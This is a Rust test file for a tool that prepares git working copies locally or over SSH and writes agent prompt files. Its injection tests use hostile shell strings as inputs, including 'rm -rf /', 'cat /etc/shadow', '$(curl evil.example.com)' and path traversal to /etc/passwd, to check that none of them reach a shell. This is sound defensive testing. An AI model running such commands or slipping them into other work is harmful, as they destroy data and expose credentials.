//! Tests for target-aware working-copy preparation (split from `issue_prep.rs`).
//!
//! These tests exercise:
//! - `WorkTarget` resolution (local vs remote),
//! - the pure `RemotePrepPlanner` (command planning without execution),
//! - local integration with real temp git repos (clean prep, dirty Stop/
//!   Discard, owned-metadata ignored, clone-when-missing).

use super::ensure_workdir_cloned;
use super::*;
use crate::app_input::issue_git_prep;

use std::path::{Path, PathBuf};
use std::process::Command;

use jefe::domain::RemoteRepositorySettings;

trait TestResultExt<T> {
    fn value_or_panic(self, context: &str) -> T;
    fn error_or_panic(self, context: &str) -> String;
}

impl<T, E: std::fmt::Debug> TestResultExt<T> for Result<T, E> {
    fn value_or_panic(self, context: &str) -> T {
        match self {
            Ok(value) => value,
            Err(error) => panic!("{context}: {error:?}"),
        }
    }

    fn error_or_panic(self, context: &str) -> String {
        match self {
            Ok(_) => panic!("{context}: expected error"),
            Err(error) => format!("{error:?}"),
        }
    }
}

trait TestOptionExt<T> {
    fn value_or_panic(self, context: &str) -> T;
}

impl<T> TestOptionExt<T> for Option<T> {
    fn value_or_panic(self, context: &str) -> T {
        match self {
            Some(value) => value,
            None => panic!("{context}: expected Some, got None"),
        }
    }
}

/// Standard work dir used by the planner tests.
const PLAN_WORK_DIR: &str = "/home/acoliver/work";

fn remote_settings() -> RemoteRepositorySettings {
    RemoteRepositorySettings {
        enabled: true,
        login_user: "ubuntu".to_owned(),
        host: "build.example.com".to_owned(),
        run_as_user: "acoliver".to_owned(),
        setup_env_default: false,
    }
}

fn identity() -> CloneIdentity {
    CloneIdentity::parse("acme/widgets").value_or_panic("test fixture identity")
}

// ── WorkTarget resolution ──────────────────────────────────────────

#[test]
fn local_target_when_remote_disabled() {
    let remote = RemoteRepositorySettings::default();
    assert_eq!(WorkTarget::from_remote(&remote), WorkTarget::Local);
}

#[test]
fn remote_target_when_enabled() {
    let remote = remote_settings();
    assert!(matches!(
        WorkTarget::from_remote(&remote),
        WorkTarget::Remote(_)
    ));
}

#[test]
fn local_target_when_enabled_but_host_missing() {
    let remote = RemoteRepositorySettings {
        enabled: true,
        login_user: "ubuntu".to_owned(),
        host: String::new(),
        run_as_user: String::new(),
        setup_env_default: false,
    };
    assert_eq!(WorkTarget::from_remote(&remote), WorkTarget::Local);
}

// ── RemotePrepPlanner: command planning ────────────────────────────

#[test]
fn plan_uses_ssh_t_not_tt() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: "do the work",
    });
    assert!(!ops.is_empty());
    for op in &ops {
        assert!(
            op.ssh_argv.iter().any(|a| a == "-T"),
            "every remote op must use -T (got {:?})",
            op.ssh_argv
        );
        assert!(
            !op.ssh_argv.iter().any(|a| a == "-tt"),
            "no remote prep op may use -tt (got {:?})",
            op.ssh_argv
        );
    }
}

#[test]
fn plan_targets_remote_host_user() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: "do the work",
    });
    assert!(!ops.is_empty());
    for op in &ops {
        assert!(
            op.ssh_argv.iter().any(|a| a == "ubuntu@build.example.com"),
            "every op must target ubuntu@build.example.com (got {:?})",
            op.ssh_argv
        );
    }
}

#[test]
fn plan_applies_run_as_user() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: "do the work",
    });
    // run_as_user=acoliver differs from login_user=ubuntu → every command
    // is wrapped in `sudo -n su - acoliver -c`.
    for op in &ops {
        let cmd = op
            .ssh_argv
            .iter()
            .find(|a| a.contains("sudo"))
            .unwrap_or_else(|| {
                panic!(
                    "run_as_user must wrap command in sudo -n su - acoliver (got {:?})",
                    op.ssh_argv
                )
            });
        assert!(cmd.contains("acoliver"), "wrapped command: {cmd}");
    }
}

#[test]
fn plan_prompt_transferred_via_stdin_not_shell() {
    let adversarial = "'; rm -rf /; echo '";
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: adversarial,
    });
    // The final op writes the prompt via stdin.
    let prompt_op = ops
        .iter()
        .find(|op| op.stdin_prompt.is_some())
        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
    // The command string must NOT contain the raw adversarial prompt —
    // it is transferred via stdin, not interpolated.
    for arg in &prompt_op.ssh_argv {
        assert!(
            !arg.contains("rm -rf"),
            "adversarial prompt must not appear in shell argv (got {arg})"
        );
    }
}

#[test]
fn plan_does_not_create_local_workdir() {
    // The planner is pure: it must never touch the local filesystem.
    // Verify by pointing at a non-existent local path and checking no
    // directory was created.
    let local_marker = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("target/tmp/issue_prep_should_not_create_this");
    let _ = std::fs::remove_dir_all(&local_marker);
    let planner = RemotePrepPlanner::new(remote_settings());
    let _ops = planner.plan(&PlanInputs {
        work_dir: &local_marker,
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: "prompt",
    });
    assert!(
        !local_marker.exists(),
        "remote planner must not create local directories"
    );
}

#[test]
fn plan_dirty_stop_emits_no_cleanup() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: true,
        prompt: "prompt",
    });
    // Dirty + Stop: no reset/clean, no checkout, no prompt write.
    assert!(
        ops.iter().all(|op| !op
            .ssh_argv
            .iter()
            .any(|a| a.contains("git reset") || a.contains("git clean"))),
        "Stop policy must not plan reset/clean: {ops:?}"
    );
}

#[test]
fn plan_dirty_discard_emits_cleanup_then_prep() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Discard,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: true,
        prompt: "prompt",
    });
    // Discard: reset --hard + clean -fd first, then checkout, then prompt.
    let reset_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git reset")))
        .value_or_panic("a reset op must be planned");
    let checkout_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git checkout")))
        .value_or_panic("a checkout op must be planned");
    let prompt_idx = ops
        .iter()
        .position(|op| op.stdin_prompt.is_some())
        .value_or_panic("a prompt-write op must be planned");
    assert!(reset_idx < checkout_idx, "reset before checkout");
    assert!(checkout_idx < prompt_idx, "checkout before prompt write");
}

#[test]
fn plan_clone_when_missing() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: false,
        exists_not_git: false,
        is_dirty: false,
        prompt: "prompt",
    });
    assert!(
        ops.iter()
            .any(|op| op.ssh_argv.iter().any(|a| a.contains("git clone"))),
        "missing worktree must plan a clone: {ops:?}"
    );
    // Clone uses the canonical HTTPS URL.
    assert!(
        ops.iter().any(|op| op
            .ssh_argv
            .iter()
            .any(|a| a.contains("https://github.com/acme/widgets.git"))),
        "clone must use canonical HTTPS URL: {ops:?}"
    );
}

#[test]
fn plan_https_url_regardless_of_remote_enabled() {
    // Remote is enabled but clone URL must still be HTTPS (no SSH
    // inference from remote.enabled).
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: false,
        exists_not_git: false,
        is_dirty: false,
        prompt: "prompt",
    });
    let clone_op = ops
        .iter()
        .find(|op| op.ssh_argv.iter().any(|a| a.contains("git clone")))
        .unwrap_or_else(|| panic!("expected a clone op: {ops:?}"));
    assert!(
        clone_op
            .ssh_argv
            .iter()
            .any(|a| a.contains("https://github.com/")),
        "clone must use HTTPS even when remote enabled: {clone_op:?}"
    );
    assert!(
        clone_op
            .ssh_argv
            .iter()
            .all(|a| !a.contains("git@github.com")),
        "clone must not use SSH form: {clone_op:?}"
    );
}

// ── Local integration tests with real temp repos ───────────────────
//
// These exercise the local target path with real git repositories in a
// temp directory. They prove: existing clean prep, missing clone
// failure (no identity), non-git dir failure, dirty Stop/Discard,
// owned-metadata (.jefe/.llxprt) ignored, and prompt written last.

/// Create a bare origin repo with an initial commit on `main`, and return
/// its path.
fn bare_origin_with_commit(label: &str) -> PathBuf {
    let tmp = std::env::temp_dir().join(format!(
        "jefe-issue184-origin-{}-{}",
        label,
        std::process::id()
    ));
    let _ = std::fs::remove_dir_all(&tmp);
    // Create a working repo, commit, then bare-clone it to simulate an
    // origin with origin/HEAD set.
    let work = tmp.join("work-src");
    std::fs::create_dir_all(&work).value_or_panic("create work-src dir");
    run_git(&work, &["init", "-b", "main"]);
    run_git(&work, &["config", "user.email", "test@example.com"]);
    run_git(&work, &["config", "user.name", "Test"]);
    std::fs::write(work.join("README.md"), "# test\n").value_or_panic("write README");
    run_git(&work, &["add", "."]);
    run_git(&work, &["commit", "-m", "init"]);
    let bare = tmp.join("origin.git");
    run_git(
        &work,
        &[
            "clone",
            "--bare",
            &work.to_string_lossy(),
            &bare.to_string_lossy(),
        ],
    );
    // Set HEAD so symbolic-ref works in clones.
    run_git(&bare, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    bare
}

/// Clone the bare origin into a fresh work dir, set origin/HEAD, and
/// return the work dir path.
fn clone_origin(origin: &Path, label: &str) -> PathBuf {
    let work = std::env::temp_dir().join(format!(
        "jefe-issue184-clone-{}-{}-{}",
        label,
        std::process::id(),
        rand_label()
    ));
    run_git(
        Path::new("."),
        &["clone", &origin.to_string_lossy(), &work.to_string_lossy()],
    );
    run_git(&work, &["remote", "set-head", "origin", "-a"]);
    work
}

fn rand_label() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_nanos());
    format!("{nanos}")
}

fn run_git(cwd: &Path, args: &[&str]) {
    let out = Command::new("git")
        .current_dir(cwd)
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .output()
        .value_or_panic("git spawned");
    assert!(
        out.status.success(),
        "git {} failed: {}",
        args.join(" "),
        String::from_utf8_lossy(&out.stderr)
    );
}

fn cleanup(path: &Path) {
    let _ = std::fs::remove_dir_all(path);
}

#[test]
fn local_existing_clean_prep_writes_prompt_last() {
    let origin = bare_origin_with_commit("clean");
    let work = clone_origin(&origin, "clean");
    // Pre-create .jefe so we prove owned metadata is ignored.
    std::fs::create_dir_all(work.join(".jefe")).value_or_panic("create .jefe");
    std::fs::write(work.join(".jefe/issue-prompt.md"), "OLD").value_or_panic("write OLD prompt");

    let prompt = "Do the work on issue 184.";
    let outcome =
        prepare_local(&work, None, DirtyPolicy::Stop, prompt).value_or_panic("prepare_local");
    assert_eq!(outcome, PrepOutcome::Ready);

    // The prompt was overwritten (written last).
    let written = std::fs::read_to_string(work.join(".jefe/issue-prompt.md"))
        .value_or_panic("read written prompt");
    assert_eq!(written, prompt);

    cleanup(origin.parent().unwrap_or(&origin));
    cleanup(&work);
}

#[test]
fn local_linked_worktree_is_detected_as_git() {
    // In a linked worktree, `.git` is a FILE (pointing to the parent's
    // worktrees metadata), not a directory. The old `test -d .git` / `.git`
    // dir check would fail here; `is_git_workdir` must use
    // `git rev-parse --is-inside-work-tree`.
    let origin = bare_origin_with_commit("linkedwt");
    // Clone origin into a primary work, then add a linked worktree.
    let primary = clone_origin(&origin, "linkedwt-primary");
    let linked = std::env::temp_dir().join(format!(
        "jefe-issue184-linked-{}-{}",
        std::process::id(),
        rand_label()
    ));
    run_git(&primary, &["worktree", "add", &linked.to_string_lossy()]);
    // Sanity: in a linked worktree `.git` is a file, not a dir.
    assert!(
        linked.join(".git").is_file(),
        "linked worktree must have .git as a file, not a directory"
    );
    // is_git_workdir must detect this as a valid git workdir.
    assert!(
        issue_git_prep::is_git_workdir(&linked),
        "linked worktree must be detected as a git workdir"
    );

    cleanup(&linked);
    cleanup(&primary);
    cleanup(origin.parent().unwrap_or(&origin));
}

#[test]
fn local_linked_worktree_on_non_default_branch_fails_safely() {
    // A linked worktree on a non-default branch must NOT be silently reset
    // to the default branch (that would move the wrong branch ref and risk
    // discarding commits). The safe behavior returns a clear error instead.
    let origin = bare_origin_with_commit("linkedwtfail");
    let primary = clone_origin(&origin, "linkedwtfail-primary");
    let linked = std::env::temp_dir().join(format!(
        "jefe-issue184-linkedfail-{}-{}",
        std::process::id(),
        rand_label()
    ));
    run_git(&primary, &["worktree", "add", &linked.to_string_lossy()]);
    run_git(&linked, &["remote", "set-head", "origin", "-a"]);

    let result = prepare_local(&linked, None, DirtyPolicy::Stop, "prompt");
    let err = result.error_or_panic("linked worktree on non-default branch must error");
    assert!(
        err.contains("not the default"),
        "error must explain wrong-branch refusal: {err}"
    );

    cleanup(&linked);
    cleanup(&primary);
    cleanup(origin.parent().unwrap_or(&origin));
}

#[test]
fn local_linked_worktree_on_default_branch_succeeds() {
    // When the primary worktree is NOT on `main`, a linked worktree CAN
    // check out `main`. In that case prep must succeed normally.
    let origin = bare_origin_with_commit("linkedwtok");
    let primary = clone_origin(&origin, "linkedwtok-primary");
    // Move the primary off `main` so the linked worktree can use it.
    run_git(&primary, &["checkout", "-b", "feature-off-main"]);
    let linked = std::env::temp_dir().join(format!(
        "jefe-issue184-linkedok-{}-{}",
        std::process::id(),
        rand_label()
    ));
    // Add the linked worktree checking out the existing `main` branch.
    run_git(
        &primary,
        &["worktree", "add", &linked.to_string_lossy(), "main"],
    );
    run_git(&linked, &["remote", "set-head", "origin", "-a"]);

    let outcome =
        prepare_local(&linked, None, DirtyPolicy::Stop, "prompt").value_or_panic("prepare_local");
    assert_eq!(outcome, PrepOutcome::Ready);
    assert!(linked.join(".jefe/issue-prompt.md").exists());

    cleanup(&linked);
    cleanup(&primary);
    cleanup(origin.parent().unwrap_or(&origin));
}

#[test]
fn local_missing_without_identity_fails_safely() {
    let work = std::env::temp_dir().join(format!(
        "jefe-issue184-missing-{}-{}",
        std::process::id(),
        rand_label()
    ));
    // No identity → must fail, not create the dir.
    let result = prepare_local(&work, None, DirtyPolicy::Stop, "prompt");
    assert!(result.is_err(), "missing dir with no identity must fail");
    assert!(
        !work.exists(),
        "must not create the work dir when there is no clone identity"
    );
}

#[test]
fn local_existing_non_git_dir_fails() {
    let work = std::env::temp_dir().join(format!(
        "jefe-issue184-nongit-{}-{}",
        std::process::id(),
        rand_label()
    ));
    std::fs::create_dir_all(&work).value_or_panic("create non-git dir");
    std::fs::write(work.join("file.txt"), "not a repo").value_or_panic("write non-repo file");
    let result = prepare_local(&work, None, DirtyPolicy::Stop, "prompt");
    assert!(result.is_err(), "non-git dir must fail safely");
    let err = result.error_or_panic("non-git dir must error");
    assert!(
        err.contains("not a git worktree"),
        "error must explain the non-git dir: {err}"
    );
    cleanup(&work);
}

#[test]
fn local_dirty_stop_returns_dirty_without_prompt() {
    let origin = bare_origin_with_commit("dirtystop");
    let work = clone_origin(&origin, "dirtystop");
    // Make the worktree dirty with a REAL (non-ignored) change.
    std::fs::write(work.join("src.txt"), "dirty change").value_or_panic("write dirty change");

    let outcome =
        prepare_local(&work, None, DirtyPolicy::Stop, "prompt").value_or_panic("prepare_local");
    assert_eq!(outcome, PrepOutcome::Dirty);

    // The dirty change is preserved (Stop does not clean).
    let preserved =
        std::fs::read_to_string(work.join("src.txt")).value_or_panic("read preserved dirty change");
    assert_eq!(preserved, "dirty change");
    // No prompt written (Stop aborts before prompt write).
    assert!(!work.join(".jefe/issue-prompt.md").exists());

    cleanup(origin.parent().unwrap_or(&origin));
    cleanup(&work);
}

#[test]
fn local_dirty_discard_cleans_and_writes_prompt() {
    let origin = bare_origin_with_commit("dirtydiscard");
    let work = clone_origin(&origin, "dirtydiscard");
    std::fs::write(work.join("src.txt"), "dirty change").value_or_panic("write dirty change");

    let prompt = "After discard, do the work.";
    let outcome =
        prepare_local(&work, None, DirtyPolicy::Discard, prompt).value_or_panic("prepare_local");
    assert_eq!(outcome, PrepOutcome::Ready);

    // The dirty change was discarded.
    assert!(!work.join("src.txt").exists());
    // Prompt written.
    let written = std::fs::read_to_string(work.join(".jefe/issue-prompt.md"))
        .value_or_panic("read written prompt");
    assert_eq!(written, prompt);

    cleanup(origin.parent().unwrap_or(&origin));
    cleanup(&work);
}

#[test]
fn local_owned_metadata_jefe_llxprt_ignored_as_dirty() {
    let origin = bare_origin_with_commit("ownedmeta");
    let work = clone_origin(&origin, "ownedmeta");
    // Only .jefe/ and .llxprt/ changes → must NOT be dirty.
    std::fs::create_dir_all(work.join(".jefe")).value_or_panic("create .jefe");
    std::fs::write(work.join(".jefe/issue-prompt.md"), "owned").value_or_panic("write .jefe");
    std::fs::create_dir_all(work.join(".llxprt")).value_or_panic("create .llxprt");
    std::fs::write(work.join(".llxprt/LLXPRT.md"), "owned").value_or_panic("write .llxprt");

    let outcome =
        prepare_local(&work, None, DirtyPolicy::Stop, "prompt").value_or_panic("prepare_local");
    assert_eq!(
        outcome,
        PrepOutcome::Ready,
        "owned .jefe/.llxprt paths must not count as dirty"
    );

    cleanup(origin.parent().unwrap_or(&origin));
    cleanup(&work);
}

#[test]
fn local_clone_when_missing_with_identity() {
    // Build a local bare origin, then prove prep clones it when given an
    // identity whose clone_url points at the local bare repo.
    let origin = bare_origin_with_commit("clonemissing");
    let work = std::env::temp_dir().join(format!(
        "jefe-issue184-clone-target-{}-{}",
        std::process::id(),
        rand_label()
    ));
    // CloneIdentity forces HTTPS, so we cannot use it against a local
    // file:// bare repo. Instead, exercise the production clone seam
    // (ensure_workdir_cloned) with the bare path directly, then run the
    // full post-clone prep sequence via the production prep function.
    let clone_url = origin.to_string_lossy().into_owned();
    ensure_workdir_cloned(&work, Some(&clone_url)).value_or_panic("ensure_workdir_cloned");
    assert!(work.join(".git").exists(), "work dir must be cloned");
    // Set origin/HEAD so prepare_issue_workdir can resolve the branch.
    run_git(&work, &["remote", "set-head", "origin", "-a"]);
    // Now run the full post-clone prep (dirty check → prep → prompt).
    let outcome =
        prepare_local(&work, None, DirtyPolicy::Stop, "prompt").value_or_panic("prepare_local");
    assert_eq!(outcome, PrepOutcome::Ready);
    assert!(work.join(".jefe/issue-prompt.md").exists());

    cleanup(origin.parent().unwrap_or(&origin));
    cleanup(&work);
}

// ── Target-aware PR prompt writing (reuses write_prompt_to_target) ──────
//
// The PR send path (`prs_orchestration::dispatch_pr_agent_chooser_confirm`)
// reuses the issue-prep safe target prompt writer for writing
// `.jefe/pr-prompt.md` to the local filesystem or a remote host. These tests
// exercise both paths, including adversarial content that must never appear
// in any shell argv.

/// Relative path for the PR prompt — must match `prs_orchestration`.
const PR_PROMPT_RELATIVE_PATH: &str = ".jefe/pr-prompt.md";

/// A local PR prompt write via `write_prompt_to_target` creates the `.jefe`
/// directory and writes the content exactly — including adversarial
/// metacharacters that must NEVER be interpolated into a shell (the local
/// path uses `std::fs::write`, no shell at all).
#[test]
fn pr_prompt_local_write_writes_exact_content_with_adversarial_chars() {
    let work_dir = std::env::temp_dir().join(format!(
        "jefe-pr-prompt-local-{}-{}",
        std::process::id(),
        rand_label()
    ));
    let adversarial = "'; rm -rf /; echo '`\n$(whoami)\n\" && touch PWNED";
    let result = write_prompt_to_target(
        &WorkTarget::Local,
        &work_dir,
        PR_PROMPT_RELATIVE_PATH,
        adversarial,
    );
    assert!(
        result.is_ok(),
        "local prompt write must succeed: {:?}",
        result.err()
    );

    let written = std::fs::read_to_string(work_dir.join(PR_PROMPT_RELATIVE_PATH))
        .value_or_panic("read PR prompt");
    assert_eq!(written, adversarial, "content must match exactly");
    // No PWNED file was created (no shell injection on the local path).
    assert!(
        !work_dir.join("PWNED").exists(),
        "adversarial content must not create files"
    );
    cleanup(&work_dir);
}

/// A remote PR prompt write plans `ssh -T` with prompt bytes via stdin,
/// transferring adversarial content WITHOUT it appearing in the shell argv.
/// This uses the pure `RemotePrepPlanner` so no SSH connection is made — it
/// records the planned operation.
#[test]
fn pr_prompt_remote_plan_transfers_prompt_via_stdin_not_shell() {
    let adversarial = "'; cat /etc/shadow; echo '\n$(curl evil.example.com)";
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: adversarial,
    });
    // The final op writes the prompt via stdin.
    let prompt_op = ops
        .iter()
        .find(|op| op.stdin_prompt.is_some())
        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
    // The command argv must NOT contain the raw adversarial prompt.
    for arg in &prompt_op.ssh_argv {
        assert!(
            !arg.contains("/etc/shadow"),
            "adversarial prompt must not appear in shell argv (got {arg})"
        );
        assert!(
            !arg.contains("evil.example.com"),
            "adversarial URL must not appear in shell argv (got {arg})"
        );
    }
    // The prompt file path in the argv must be the issue prompt path (the
    // planner hardcodes it); the PR path uses `write_prompt_to_target`
    // directly at runtime.
    assert!(
        prompt_op
            .ssh_argv
            .iter()
            .any(|a| a.contains(".jefe/issue-prompt.md")),
        "planned prompt op writes to .jefe/issue-prompt.md"
    );
}

/// The remote PR prompt write (via `write_prompt_to_target`) delegates to the
/// same `RemotePrepRunner::write_prompt` that the issue path uses. Since the
/// runner is not exposed for direct testing, this verifies the planner's
/// generic prompt-write op uses `ssh -T` and targets the correct host.
#[test]
fn pr_prompt_remote_target_is_correct_ssh_t_host() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: None,
        policy: DirtyPolicy::Stop,
        exists_is_git: true,
        exists_not_git: false,
        is_dirty: false,
        prompt: "PR prompt",
    });
    let prompt_op = ops
        .iter()
        .find(|op| op.stdin_prompt.is_some())
        .unwrap_or_else(|| panic!("prompt op must exist: {ops:?}"));
    assert!(
        prompt_op.ssh_argv.iter().any(|a| a == "-T"),
        "PR prompt remote op must use -T"
    );
    assert!(
        prompt_op
            .ssh_argv
            .iter()
            .any(|a| a == "ubuntu@build.example.com"),
        "PR prompt remote op must target ubuntu@build.example.com"
    );
}

/// Local PR prompt write creates the `.jefe` directory when absent.
#[test]
fn pr_prompt_local_write_creates_jefe_dir() {
    let work_dir = std::env::temp_dir().join(format!(
        "jefe-pr-prompt-mkdir-{}-{}",
        std::process::id(),
        rand_label()
    ));
    let result = write_prompt_to_target(
        &WorkTarget::Local,
        &work_dir,
        PR_PROMPT_RELATIVE_PATH,
        "content",
    );
    assert!(result.is_ok(), "should succeed: {:?}", result.err());
    assert!(work_dir.join(".jefe").exists(), ".jefe dir must be created");
    assert!(work_dir.join(PR_PROMPT_RELATIVE_PATH).exists());
    cleanup(&work_dir);
}

/// The PR prompt path constant must start with `.jefe/` (required by the safe
/// writer so it knows where to `mkdir -p`).
#[test]
fn pr_prompt_relative_path_starts_with_jefe() {
    assert!(
        PR_PROMPT_RELATIVE_PATH.starts_with(".jefe/"),
        "PR prompt path must be under .jefe/"
    );
}

// ── Path-traversal / absolute-path rejection in write_prompt_to_target ──

/// An absolute path must be rejected (never joined under the work dir to
/// overwrite an arbitrary filesystem location).
#[test]
fn write_prompt_rejects_absolute_path() {
    let result = write_prompt_to_target(
        &WorkTarget::Local,
        Path::new("/tmp/jefe-should-not-exist"),
        "/etc/passwd",
        "content",
    );
    assert!(result.is_err(), "absolute path must be rejected");
}

/// A traversal path (`..`) must be rejected (never escape the work dir).
#[test]
fn write_prompt_rejects_traversal_path() {
    let result = write_prompt_to_target(
        &WorkTarget::Local,
        Path::new("/tmp/jefe-should-not-exist"),
        ".jefe/../../../etc/passwd",
        "content",
    );
    assert!(result.is_err(), "traversal path must be rejected");
}

/// A path not starting with `.jefe/` must be rejected.
#[test]
fn write_prompt_rejects_non_jefe_path() {
    let result = write_prompt_to_target(
        &WorkTarget::Local,
        Path::new("/tmp/jefe-should-not-exist"),
        "etc/evil.md",
        "content",
    );
    assert!(result.is_err(), "non-.jefe path must be rejected");
}
